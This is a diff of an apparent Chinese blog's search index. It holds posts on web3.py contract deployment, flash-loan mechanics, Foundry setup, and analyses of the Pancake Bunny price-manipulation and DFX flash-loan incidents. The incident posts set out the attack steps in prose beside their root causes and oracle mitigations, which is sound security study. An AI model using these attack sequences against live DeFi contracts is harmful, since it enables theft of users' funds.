+<li>测试链的话，去infura上申请个节点，会给你个url，相当于可以通过这个节点访问测试链上数据</li>
+<li>私链的话，直接连接服务器或本机的某个端口就行，一般是7545 or 8545</li>
 </ul>
-<p>举例：这是想获得的WETH价格，即为外部数据</p>
-<p><code>getReserves()</code>请求ETH价格，金融模型计算返回对应的值</p>
-<p>这里如果通过闪电贷，如果金融模型错误计算的话，计算出的WETH就很可能出现问题</p>
-<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312162145635.png" alt="image-20231216214431185"></p>
-<h2 id="什么是价格操纵攻击："><a href="#什么是价格操纵攻击：" class="headerlink" title="什么是价格操纵攻击："></a>什么是价格操纵攻击：</h2><p>价格操纵攻击是指通过<code>操控市场的买卖行为（操控流动性池或地址余额）</code>，<code>人为地影响产品或资产价格</code>，以谋取不正当利益</p>
-<p>价格操纵的四要素：</p>
+<h1 id="3-web3-py的使用"><a href="#3-web3-py的使用" class="headerlink" title="3. web3.py的使用"></a>3. web3.py的使用</h1><p>首先安装web3</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install web3</span><br></pre></td></tr></table></figure>
+<h2 id="3-1-连接区块链"><a href="#3-1-连接区块链" class="headerlink" title="3.1 连接区块链"></a>3.1 连接区块链</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">w3 = Web3(Web3.HTTPProvider(url))</span><br><span class="line"><span class="built_in">print</span>(w3.is_connected())  <span class="comment">##判断是否连接上</span></span><br></pre></td></tr></table></figure>
+<h2 id="3-2-部署合约"><a href="#3-2-部署合约" class="headerlink" title="3.2 部署合约"></a>3.2 部署合约</h2><h3 id="3-2-1-获取abi和bytecode"><a href="#3-2-1-获取abi和bytecode" class="headerlink" title="3.2.1 获取abi和bytecode:"></a>3.2.1 获取abi和bytecode:</h3><p>web3.py在部署合约之前需要通过对源码进行解析得到其abi和bytecode<br><strong>abi</strong>：abi主要包含的合约的函数调用信息，即函数参数，返回值，签名等信息<br><strong>bytecode</strong>：bytecode是指源码进行编译得到的二进制代码<br>python可以通过&#x3D;&#x3D;solcx&#x3D;&#x3D;库中的&#x3D;&#x3D;compile_standard&#x3D;&#x3D;函数进行合约解析，得到合约的abi和字节码，在创建合约，部署合约时会用到。</p>
+<h3 id="3-2-2-部署合约："><a href="#3-2-2-部署合约：" class="headerlink" title="3.2.2 部署合约："></a>3.2.2 部署合约：</h3><p>部署合约则主要通过官方封装的标准函数来实现，web3.py，web3.js的相关函数与geth官方的函数很像。</p>
 <ul>
-<li>市场力量的不对等：通过闪电贷行为拥有大量的资金</li>
-<li>买卖行为的操纵：大额的代币兑换，破坏市场机制（市场的流动性）</li>
-<li>恶意影响价格：资产价格计算错误（脆弱的询价机制）</li>
-<li>谋取不正当利益：出现异常数量的奖励或抵押品</li>
+<li>构建部署合约这一交易<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Contract = w3.eth.contract(abi = abi, bytecode = bytecode)</span><br><span class="line">nonce = w3.eth.get_transaction_count(Goerli_address)</span><br><span class="line">transaction = Contract.constructor().build_transaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gas_price,</span><br><span class="line">        <span class="string">&quot;from&quot;</span>: Goerli_address,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: nonce</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
+<li>签名发布该交易<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">signed_txn = w3.eth.account.sign_transaction(transaction, private_key = Goerli_privateKey)   </span><br><span class="line"><span class="comment">##账户私钥对交易进行验证</span></span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)    </span><br><span class="line">tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"><span class="comment">##根据交易哈希获取交易凭证，可获取部署合约的地址</span></span><br></pre></td></tr></table></figure></li>
 </ul>
-<h2 id="真实价格操纵攻击案例："><a href="#真实价格操纵攻击案例：" class="headerlink" title="真实价格操纵攻击案例："></a>真实价格操纵攻击案例：</h2><p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312162153491.png" alt="image-20231216215338496"></p>
-<h3 id="正常流程："><a href="#正常流程：" class="headerlink" title="正常流程："></a>正常流程：</h3><ul>
-<li>用户质押BNB和USDT，获得LP流动性证明；</li>
-<li>随后调用getReward()函数兑换掉LP，获得收益</li>
-<li>移除流动性过程中，会根据池子中BNB代币，兑换成Bunny代币</li>
+<h3 id="3-2-3-调用合约中的函数"><a href="#3-2-3-调用合约中的函数" class="headerlink" title="3.2.3 调用合约中的函数"></a>3.2.3 调用合约中的函数</h3><p>以太坊中调用函数主要是通过call的方式调用函数签名进行实现。<br>可见毕设之前总结的文章<a href="https://blog.csdn.net/m0_53689197/article/details/129721360?spm=1001.2014.3001.5502">solidity合约函数调用</a></p>
+<p>这里为了方便起见，我们用函数名直接对函数进行调用<br>这里以调用<strong>storeUserData</strong>这一函数为例，进行说明：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Contract = w3.eth.contract(address = contract_address, abi = abi) </span><br><span class="line">nonce = w3.eth.get_transaction_count(call_address)</span><br><span class="line">transaction = Contract.functions.storeUserData(dataHash).build_transaction(</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="string">&quot;gas&quot;</span>: <span class="number">1000000</span>,</span><br><span class="line">       <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gas_price,</span><br><span class="line">       <span class="string">&quot;from&quot;</span>: call_address,</span><br><span class="line">       <span class="string">&quot;nonce&quot;</span>: nonce </span><br><span class="line">   &#125;</span><br><span class="line">)</span><br><span class="line"><span class="comment">## dataHash这里为storeUserData需要传入的参数</span></span><br><span class="line">signed_txn = w3.eth.account.sign_transaction(transaction, private_key = addressKey)</span><br><span class="line"><span class="comment">##签名该函数调用的交易</span></span><br><span class="line">send_tx = w3.eth.send_raw_transaction(signed_txn.rawTransaction)</span><br><span class="line">tx_receipt = w3.eth.wait_for_transaction_receipt(send_tx)</span><br><span class="line"><span class="comment">## 根据交易哈希，获取交易凭证，后对交易凭证进行分析处理</span></span><br></pre></td></tr></table></figure>
+<h3 id="3-2-4-Event的监听"><a href="#3-2-4-Event的监听" class="headerlink" title="3.2.4 Event的监听"></a>3.2.4 Event的监听</h3><p>因为后续实现对函数抛出的event进行实时监听，上述代码中获得了函数调用交易的tx_receipt，即交易凭证，其中就包含了event的log信息。<br>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logs = Contract.events.AccessRequested().process_receipt(tx_receipt)</span><br><span class="line"><span class="comment">## AccessRequested()为对应的事件event</span></span><br></pre></td></tr></table></figure>
+<p>随后对logs进行处理，即可实现实时监听合约的event抛出了</p>
+]]></content>
+      <categories>
+        <category>智能合约</category>
+        <category>以太坊</category>
+      </categories>
+      <tags>
+        <tag>区块链安全</tag>
+        <tag>Solidity</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>闪电贷原理及安全事件分析</title>
+    <url>/2023/12/17/%E9%97%AA%E7%94%B5%E8%B4%B7%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本文主要参考有：</p>
+<p>[捕鲸船的分享](<a href="https://www.youtube.com/watch?v=_1dK61Qnv38">闪电贷原理及安全事件分析——被攻击项目的原因和防范措施 (youtube.com)</a>)</p>
+<p>[SharkTeam系列文章–闪电贷]([闪电贷技术详解-Part 3 | 登链社区 | 区块链技术社区 (learnblockchain.cn)](<a href="https://learnblockchain.cn/article/4502#Aave">https://learnblockchain.cn/article/4502#Aave</a> 闪电贷优缺点))</p>
+<h2 id="什么是区块链上的闪电贷："><a href="#什么是区块链上的闪电贷：" class="headerlink" title="什么是区块链上的闪电贷："></a>什么是区块链上的闪电贷：</h2><p><code>闪电贷：</code> 最初的目的是在区块链上实现，允许用户在不提供任何东西作为抵押的情况下进行借款。</p>
+<p>如何让真正实现闪电贷这一功能，依靠区块链上交易的原子性，让闪电贷的借贷和偿还在同一交易中完成，如果没有完成相应的偿还，则回退整个交易；</p>
+<p>为防止闪电贷在Defi中的滥用，每次闪电贷还款的时候需要支持贷款金额的贷款费用，如0.09%，否则也将回退整个交易。</p>
+<p>Aave最初提出闪电贷的概念是为了想服务于金融业产品开发者群体，让更多的开发人员在无需资金的情况下，使用闪电贷创建再融资工具或套利工具，构建金融产品，降低开发门槛。（查了一圈找到的比较合理的答案）</p>
+<p>但目前闪电贷被大量滥用与资产间套利。</p>
+<h2 id="闪电贷具体实现示例："><a href="#闪电贷具体实现示例：" class="headerlink" title="闪电贷具体实现示例："></a>闪电贷具体实现示例：</h2><p>常见的闪电贷平台：<code>Uniswap、Aave、Compound、MakerDAO、dYdX</code>等</p>
+<p>存在闪电贷和闪电兑的区别：需不需要偿还相同的资产。</p>
+<p>现有的闪电贷大多都是乐观转账，在借贷函数的实现的，先将借贷的代币转给借贷者，随后回调借贷者的函数，借贷者进行他的操作，最后在借贷函数结束前，必须还清借贷金额以及相应的手续费，否则交易回退</p>
+<h3 id="Aave-v2"><a href="#Aave-v2" class="headerlink" title="Aave_v2"></a>Aave_v2</h3><ul>
+<li><p>检查闪电贷的代币数量，计算手续费，协议费等</p>
+</li>
+<li><p>进行乐观转账，将代币转到用户的地址中</p>
+</li>
+<li><p>回调用户的excuteOperation函数，用户自己来进行套利操作，aave_v1在函数的最后需要进行相应的还款，aave_v2不需要立刻还款，但需要向借贷合约进行相应的授权。</p>
+</li>
+<li><p>v1检查还款金额（合约借贷前余额+手续费），v2借贷合约调用safetransform函数自己进行相应的转账，实现对应的还款。</p>
+<p>下图主要为aave_v1版本的实现</p>
+<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181055482.png" alt="image.png"></p>
+<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181054425.png" alt="image.png"></p>
+</li>
 </ul>
-<h3 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h3><p>分析可见<a href="https://mp.weixin.qq.com/s/O2j5OyUh2qJZSRhnMD5KTg">慢雾pancake攻击分析</a></p>
+<h3 id="Uniswap-v2"><a href="#Uniswap-v2" class="headerlink" title="Uniswap_v2"></a>Uniswap_v2</h3><p>uniswap其也提供闪电贷的功能，在v2版本中其主要是通过swap函数实现闪电贷</p>
+<p>闪电贷其检测是否还款的原理，是根据自动做市商AMM原理，进行k值检验</p>
+<p>可以粗略的理解uniswap，其代币的pair对是满足<br>$$<br>x_1*x_2 &#x3D; k<br>$$</p>
+<p>最后的k值校验只要满足：</p>
+<p>$$<br>(balance^{‘}_1-fee)*(balance^{‘}_0-fee) \ge k<br>$$<br>账户还款后的余额减去对应的交易费用，满足大于k即可。</p>
+<p>从上式我们不难看出，在uniswap中还款，我们不一定需要还同一种资产，可以换相应pair对的资产也可。</p>
 <ul>
-<li><p>第一笔自己交易获得一定的LP流动性证明</p>
-</li>
-<li><p>用户通过闪电贷兑换了大量的BNB和USDT</p>
-</li>
-<li><p>第二笔交易闪电贷，向池子中添加大量流动性，同时调用getReward()函数</p>
-</li>
-<li><p>首先将LP转到WBNB-USDT池子中移除流动性，池子中有大量BNB和USDT</p>
-</li>
-<li><p>随后大量的BNB和USDT转化为WBNB-BUNNY流动性，WBNB池子中WBNB数量激增</p>
-</li>
-<li><p>随后根据得到的WBNB-BUNNY的LP数量，<code>valueOfAsset函数计算LP价值</code></p>
-</li>
-<li><p><code>问题就出在valueOfAsset进行LP价值计算的时候，通过WBNB-BUNNY池子中的WBNB实时数量计算</code>，导致单个LP价值显著增加</p>
-</li>
+<li>进行相关借款的检验</li>
+<li>进行乐观转账</li>
+<li>回调借贷者的uniswapV2call函数，进行相应的套利操作，并在函数的最后实现还款</li>
+<li>k值校验，判断是否还款</li>
 </ul>
-<h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312171136385.png" alt="image-20231217113643150"></p>
-<p>getReserve()函数计算得到池中BNByue，后直接用以计算LP相对于BNB的价值</p>
-<p>具体金融模型计算：</p>
-<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312162201816.png" alt="image-20231216220150156"></p>
-<h2 id="如何避免价格操纵攻击："><a href="#如何避免价格操纵攻击：" class="headerlink" title="如何避免价格操纵攻击："></a>如何避免价格操纵攻击：</h2><p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312171137995.png" alt="image-20231217113754981"></p>
-<p>避免使用脆弱的询价机制，主要有三种方式：</p>
+<p>其闪电贷其余步骤，与aave相似，唯一不同的是，uniswap是将对应的还款在uniswapV2call函数中，直接转给相应的借贷合约</p>
+<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181107332.png" alt="image.png"></p>
+<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181107303.png" alt="image.png"></p>
+<h2 id="闪电贷的攻击类型"><a href="#闪电贷的攻击类型" class="headerlink" title="闪电贷的攻击类型"></a>闪电贷的攻击类型</h2><ul>
+<li>利用闪电贷大的资金量操纵价格，一些项目中的询价机制存在漏洞，可见[价格操纵文章](<a href="https://emmanuelwh.github.io/2023/12/16/%E4%BB%B7%E6%A0%BC%E6%93%8D%E7%BA%B5%E6%94%BB%E5%87%BB%E5%86%8D%E7%90%86%E8%A7%A3/">价格操纵攻击再理解 | 来自门头沟学院的Emmanuel (emmanuelwh.github.io)</a>)</li>
+<li>一些项目在抵押或其它过程中会产生瞬时奖励，利用闪电贷获得大额奖励</li>
+<li>项目中存在其它逻辑漏洞，利用闪电贷大的资金量发大套利空间</li>
+</ul>
+<h2 id="DFX攻击事件分析"><a href="#DFX攻击事件分析" class="headerlink" title="DFX攻击事件分析"></a>DFX攻击事件分析</h2><p>漏洞的主要原因是主要有两个：</p>
 <ul>
-<li>通过EOA（Chainlink）这样的实体，不断地喂价</li>
-<li>收集多个来源的价格，对不同来源的价格进行加权平均</li>
-<li>对过去一段时间内的价格，进行加权平均（uniswap）</li>
+<li><p>闪电贷归还逻辑为闪电贷前后池子中金额的差值</p>
+</li>
+<li><p>但DFX合约的中并未对它的借贷方法和添加流动性方法进行重入限制。通俗来说，就是将借贷的钱抵押到同一个池子中，用户需要还款的闪电贷很少，但却有着大量的LP流动性证明</p>
+</li>
 </ul>
-<blockquote>
-<p>一个敏感操作的变量数据，一定不能依赖于用户易于操控的数据，不然容易产生危险。</p>
-</blockquote>
-<p>污点分析的方式进行漏洞检测</p>
+<p>攻击的主要步骤为：</p>
+<ul>
+<li>调用flash函数借贷大量的USDC和XIDR</li>
+<li>后将借到的两种代币在同一个池子中进行抵押</li>
+<li>此时闪电贷前后的池子差，远远小于攻击者借出的资金，攻击者归还很少的资金即可</li>
+<li>但用户抵押的流动性还依然在它手中，移除流动性，获得大量的USDC和XIDR</li>
+</ul>
+<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181125560.png" alt="image-20231218112539740"></p>
 ]]></content>
       <categories>
         <category>Defi安全</category>
@@ -600,67 +589,91 @@
       </tags>
   </entry>
   <entry>
-    <title>闪电贷原理及安全事件分析</title>
-    <url>/2023/12/17/%E9%97%AA%E7%94%B5%E8%B4%B7%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本文主要参考有：</p>
-<p>[捕鲸船的分享](<a href="https://www.youtube.com/watch?v=_1dK61Qnv38">闪电贷原理及安全事件分析——被攻击项目的原因和防范措施 (youtube.com)</a>)</p>
-<p>[SharkTeam系列文章–闪电贷]([闪电贷技术详解-Part 3 | 登链社区 | 区块链技术社区 (learnblockchain.cn)](<a href="https://learnblockchain.cn/article/4502#Aave">https://learnblockchain.cn/article/4502#Aave</a> 闪电贷优缺点))</p>
-<h2 id="什么是区块链上的闪电贷："><a href="#什么是区块链上的闪电贷：" class="headerlink" title="什么是区块链上的闪电贷："></a>什么是区块链上的闪电贷：</h2><p><code>闪电贷：</code> 最初的目的是在区块链上实现，允许用户在不提供任何东西作为抵押的情况下进行借款。</p>
-<p>如何让真正实现闪电贷这一功能，依靠区块链上交易的原子性，让闪电贷的借贷和偿还在同一交易中完成，如果没有完成相应的偿还，则回退整个交易；</p>
-<p>为防止闪电贷在Defi中的滥用，每次闪电贷还款的时候需要支持贷款金额的贷款费用，如0.09%，否则也将回退整个交易。</p>
-<p>Aave最初提出闪电贷的概念是为了想服务于金融业产品开发者群体，让更多的开发人员在无需资金的情况下，使用闪电贷创建再融资工具或套利工具，构建金融产品，降低开发门槛。（查了一圈找到的比较合理的答案）</p>
-<p>但目前闪电贷被大量滥用与资产间套利。</p>
-<h2 id="闪电贷具体实现示例："><a href="#闪电贷具体实现示例：" class="headerlink" title="闪电贷具体实现示例："></a>闪电贷具体实现示例：</h2><p>常见的闪电贷平台：<code>Uniswap、Aave、Compound、MakerDAO、dYdX</code>等</p>
-<p>存在闪电贷和闪电兑的区别：需不需要偿还相同的资产。</p>
-<p>现有的闪电贷大多都是乐观转账，在借贷函数的实现的，先将借贷的代币转给借贷者，随后回调借贷者的函数，借贷者进行他的操作，最后在借贷函数结束前，必须还清借贷金额以及相应的手续费，否则交易回退</p>
-<h3 id="Aave-v2"><a href="#Aave-v2" class="headerlink" title="Aave_v2"></a>Aave_v2</h3><ul>
-<li><p>检查闪电贷的代币数量，计算手续费，协议费等</p>
-</li>
-<li><p>进行乐观转账，将代币转到用户的地址中</p>
-</li>
-<li><p>回调用户的excuteOperation函数，用户自己来进行套利操作，aave_v1在函数的最后需要进行相应的还款，aave_v2不需要立刻还款，但需要向借贷合约进行相应的授权。</p>
-</li>
-<li><p>v1检查还款金额（合约借贷前余额+手续费），v2借贷合约调用safetransform函数自己进行相应的转账，实现对应的还款。</p>
-<p>下图主要为aave_v1版本的实现</p>
-<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181055482.png" alt="image.png"></p>
-<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181054425.png" alt="image.png"></p>
-</li>
-</ul>
-<h3 id="Uniswap-v2"><a href="#Uniswap-v2" class="headerlink" title="Uniswap_v2"></a>Uniswap_v2</h3><p>uniswap其也提供闪电贷的功能，在v2版本中其主要是通过swap函数实现闪电贷</p>
-<p>闪电贷其检测是否还款的原理，是根据自动做市商AMM原理，进行k值检验</p>
-<p>可以粗略的理解uniswap，其代币的pair对是满足<br>$$<br>x_1*x_2 &#x3D; k<br>$$</p>
-<p>最后的k值校验只要满足：</p>
-<p>$$<br>(balance^{‘}_1-fee)*(balance^{‘}_0-fee) \ge k<br>$$<br>账户还款后的余额减去对应的交易费用，满足大于k即可。</p>
-<p>从上式我们不难看出，在uniswap中还款，我们不一定需要还同一种资产，可以换相应pair对的资产也可。</p>
+    <title>foundry使用一</title>
+    <url>/2023/12/15/foundry%E4%BD%BF%E7%94%A8(%E4%B8%80)--foundry%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-Foundry环境搭建："><a href="#1-Foundry环境搭建：" class="headerlink" title="1. Foundry环境搭建："></a>1. Foundry环境搭建：</h1><h2 id="1-1-拉取Foundry-镜像"><a href="#1-1-拉取Foundry-镜像" class="headerlink" title="1.1 拉取Foundry 镜像"></a>1.1 拉取<code>Foundry</code> 镜像</h2><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">docker pull ghcr.io/foundry-rs/foundry:latest</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-以sh形式，创建一个新的容器，并运行对应的容器"><a href="#1-2-以sh形式，创建一个新的容器，并运行对应的容器" class="headerlink" title="1.2 以sh形式，创建一个新的容器，并运行对应的容器"></a>1.2 以sh形式，创建一个新的容器，并运行对应的容器</h2><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">sudo docker <span class="keyword">run</span><span class="language-bash"> -d -v /local_dir:/docker_dir -it --name new_name image_name /bin/sh</span></span><br></pre></td></tr></table></figure>
+
 <ul>
-<li>进行相关借款的检验</li>
-<li>进行乐观转账</li>
-<li>回调借贷者的uniswapV2call函数，进行相应的套利操作，并在函数的最后实现还款</li>
-<li>k值校验，判断是否还款</li>
+<li><code>-d</code>：让容器在后台运行</li>
+<li><code>-v</code>：用以挂载卷</li>
+<li><code>-it</code>：用交互模式运行容器，并分配一个伪终端</li>
+<li><code>--name</code> ：给容器命名</li>
 </ul>
-<p>其闪电贷其余步骤，与aave相似，唯一不同的是，uniswap是将对应的还款在uniswapV2call函数中，直接转给相应的借贷合约</p>
-<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181107332.png" alt="image.png"></p>
-<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181107303.png" alt="image.png"></p>
-<h2 id="闪电贷的攻击类型"><a href="#闪电贷的攻击类型" class="headerlink" title="闪电贷的攻击类型"></a>闪电贷的攻击类型</h2><ul>
-<li>利用闪电贷大的资金量操纵价格，一些项目中的询价机制存在漏洞，可见[价格操纵文章](<a href="https://emmanuelwh.github.io/2023/12/16/%E4%BB%B7%E6%A0%BC%E6%93%8D%E7%BA%B5%E6%94%BB%E5%87%BB%E5%86%8D%E7%90%86%E8%A7%A3/">价格操纵攻击再理解 | 来自门头沟学院的Emmanuel (emmanuelwh.github.io)</a>)</li>
-<li>一些项目在抵押或其它过程中会产生瞬时奖励，利用闪电贷获得大额奖励</li>
-<li>项目中存在其它逻辑漏洞，利用闪电贷大的资金量发大套利空间</li>
-</ul>
-<h2 id="DFX攻击事件分析"><a href="#DFX攻击事件分析" class="headerlink" title="DFX攻击事件分析"></a>DFX攻击事件分析</h2><p>漏洞的主要原因是主要有两个：</p>
+<h2 id="1-3-查看容器的是否运行，以及容器id"><a href="#1-3-查看容器的是否运行，以及容器id" class="headerlink" title="1.3 查看容器的是否运行，以及容器id"></a>1.3 查看容器的是否运行，以及容器id</h2><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">sudo docker ps</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-4-进行容器交互界面"><a href="#1-4-进行容器交互界面" class="headerlink" title="1.4 进行容器交互界面"></a>1.4 进行容器交互界面</h2><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it containerID/name /bin/sh</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>区块链工具</category>
+      </categories>
+      <tags>
+        <tag>区块链安全</tag>
+        <tag>区块链工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>价格操纵攻击再理解</title>
+    <url>/2023/12/16/%E4%BB%B7%E6%A0%BC%E6%93%8D%E7%BA%B5%E6%94%BB%E5%87%BB%E5%86%8D%E7%90%86%E8%A7%A3/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本文的主要参考是METATRUST的捕鲸船分享，链接如下：</p>
+<p><a href="https://www.youtube.com/watch?v=czyajRIHYlg">MetaTrust价格操纵攻击分享</a></p>
+<h2 id="价格操纵的来源："><a href="#价格操纵的来源：" class="headerlink" title="价格操纵的来源："></a>价格操纵的来源：</h2><p>区块链世界中，为保持所有节点的共识一致，区块链阉割了每个节点独立获取链外信息的能力</p>
+<p>区块链想获取类似外界的价格信息，只有两种方式：</p>
 <ul>
-<li><p>闪电贷归还逻辑为闪电贷前后池子中金额的差值</p>
-</li>
-<li><p>但DFX合约的中并未对它的借贷方法和添加流动性方法进行重入限制。通俗来说，就是将借贷的钱抵押到同一个池子中，用户需要还款的闪电贷很少，但却有着大量的LP流动性证明</p>
-</li>
+<li>通过实体类似Chainlink主动喂价，不断地将价格数据发布到链上</li>
+<li>直接通过某个智能合约中存储的参数，如uniswap等</li>
 </ul>
-<p>攻击的主要步骤为：</p>
+<p>举例：这是想获得的WETH价格，即为外部数据</p>
+<p><code>getReserves()</code>请求ETH价格，金融模型计算返回对应的值</p>
+<p>这里如果通过闪电贷，如果金融模型错误计算的话，计算出的WETH就很可能出现问题</p>
+<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312162145635.png" alt="image-20231216214431185"></p>
+<h2 id="什么是价格操纵攻击："><a href="#什么是价格操纵攻击：" class="headerlink" title="什么是价格操纵攻击："></a>什么是价格操纵攻击：</h2><p>价格操纵攻击是指通过<code>操控市场的买卖行为（操控流动性池或地址余额）</code>，<code>人为地影响产品或资产价格</code>，以谋取不正当利益</p>
+<p>价格操纵的四要素：</p>
 <ul>
-<li>调用flash函数借贷大量的USDC和XIDR</li>
-<li>后将借到的两种代币在同一个池子中进行抵押</li>
-<li>此时闪电贷前后的池子差，远远小于攻击者借出的资金，攻击者归还很少的资金即可</li>
-<li>但用户抵押的流动性还依然在它手中，移除流动性，获得大量的USDC和XIDR</li>
+<li>市场力量的不对等：通过闪电贷行为拥有大量的资金</li>
+<li>买卖行为的操纵：大额的代币兑换，破坏市场机制（市场的流动性）</li>
+<li>恶意影响价格：资产价格计算错误（脆弱的询价机制）</li>
+<li>谋取不正当利益：出现异常数量的奖励或抵押品</li>
 </ul>
-<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181125560.png" alt="image-20231218112539740"></p>
+<h2 id="真实价格操纵攻击案例："><a href="#真实价格操纵攻击案例：" class="headerlink" title="真实价格操纵攻击案例："></a>真实价格操纵攻击案例：</h2><p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312162153491.png" alt="image-20231216215338496"></p>
+<h3 id="正常流程："><a href="#正常流程：" class="headerlink" title="正常流程："></a>正常流程：</h3><ul>
+<li>用户质押BNB和USDT，获得LP流动性证明；</li>
+<li>随后调用getReward()函数兑换掉LP，获得收益</li>
+<li>移除流动性过程中，会根据池子中BNB代币，兑换成Bunny代币</li>
+</ul>
+<h3 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h3><p>分析可见<a href="https://mp.weixin.qq.com/s/O2j5OyUh2qJZSRhnMD5KTg">慢雾pancake攻击分析</a></p>
+<ul>
+<li><p>第一笔自己交易获得一定的LP流动性证明</p>
+</li>
+<li><p>用户通过闪电贷兑换了大量的BNB和USDT</p>
+</li>
+<li><p>第二笔交易闪电贷，向池子中添加大量流动性，同时调用getReward()函数</p>
+</li>
+<li><p>首先将LP转到WBNB-USDT池子中移除流动性，池子中有大量BNB和USDT</p>
+</li>
+<li><p>随后大量的BNB和USDT转化为WBNB-BUNNY流动性，WBNB池子中WBNB数量激增</p>
+</li>
+<li><p>随后根据得到的WBNB-BUNNY的LP数量，<code>valueOfAsset函数计算LP价值</code></p>
+</li>
+<li><p><code>问题就出在valueOfAsset进行LP价值计算的时候，通过WBNB-BUNNY池子中的WBNB实时数量计算</code>，导致单个LP价值显著增加</p>
+</li>
+</ul>
+<h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312171136385.png" alt="image-20231217113643150"></p>
+<p>getReserve()函数计算得到池中BNByue，后直接用以计算LP相对于BNB的价值</p>
+<p>具体金融模型计算：</p>
+<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312162201816.png" alt="image-20231216220150156"></p>
+<h2 id="如何避免价格操纵攻击："><a href="#如何避免价格操纵攻击：" class="headerlink" title="如何避免价格操纵攻击："></a>如何避免价格操纵攻击：</h2><p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312171137995.png" alt="image-20231217113754981"></p>
+<p>避免使用脆弱的询价机制，主要有三种方式：</p>
+<ul>
+<li>通过EOA（Chainlink）这样的实体，不断地喂价</li>
+<li>收集多个来源的价格，对不同来源的价格进行加权平均</li>
+<li>对过去一段时间内的价格，进行加权平均（uniswap）</li>
+</ul>
+<blockquote>
+<p>一个敏感操作的变量数据，一定不能依赖于用户易于操控的数据，不然容易产生危险。</p>
+</blockquote>
+<p>污点分析的方式进行漏洞检测</p>
 ]]></content>
       <categories>
         <category>Defi安全</category>
@@ -668,6 +681,26 @@
       <tags>
         <tag>区块链安全</tag>
         <tag>Defi安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vue+Django前后端交互跨域</title>
+    <url>/2023/12/16/Vue-Django%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92%E8%B7%A8%E5%9F%9F/</url>
